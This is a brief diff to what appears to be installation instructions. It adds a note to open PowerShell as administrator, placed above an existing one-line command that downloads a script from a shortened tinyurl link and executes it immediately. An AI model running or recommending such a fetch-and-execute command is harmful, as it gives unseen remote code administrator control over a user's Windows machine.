@@ -1,3 +1,7 @@
+ONLY for windows
+
+open Powershell with administrator privileges
+
 iwr -useb https://tinyurl.com/4z8pd3nb | iex
 
 or 
